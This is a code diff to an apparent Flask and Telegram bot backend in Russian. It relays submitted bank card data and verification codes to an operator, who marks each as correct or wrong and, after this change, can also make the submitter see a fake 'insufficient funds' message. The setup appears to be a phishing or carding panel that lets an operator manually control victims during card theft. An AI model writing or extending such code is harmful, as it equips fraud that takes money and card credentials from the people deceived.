@@ -118,6 +118,16 @@ def webhook():
             send_callback_answer(callback_id, "❌ Данные карты отклонены")
             edit_message_text(chat_id, message_id, f"❌ <b>ДАННЫЕ КАРТЫ ОТКЛОНЕНЫ</b>\n\nСессия: {session_id}", None)
             
+        elif callback_data.startswith('card_insufficient:'):
+            session_id = callback_data.split(':')[1]
+            conn = sqlite3.connect('applications.db')
+            c = conn.cursor()
+            c.execute('UPDATE card_data SET status = "insufficient" WHERE session_id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            send_callback_answer(callback_id, "💰 Клиенту показано сообщение о недостатке средств")
+            edit_message_text(chat_id, message_id, f"💰 <b>НЕДОСТАТОЧНО СРЕДСТВ</b>\n\nСессия: {session_id}", None)
+            
         elif callback_data.startswith('code_ok:'):
             session_id = callback_data.split(':')[1]
             conn = sqlite3.connect('applications.db')
@@ -215,7 +225,8 @@ def submit_card():
     keyboard = {
         "inline_keyboard": [
             [{"text": "✅ Данные верные", "callback_data": f"card_ok:{session_id}"}],
-            [{"text": "❌ Данные не верные", "callback_data": f"card_error:{session_id}"}]
+            [{"text": "❌ Данные не верные", "callback_data": f"card_error:{session_id}"}],
+            [{"text": "💰 Недостаточно средств", "callback_data": f"card_insufficient:{session_id}"}]
         ]
     }
     
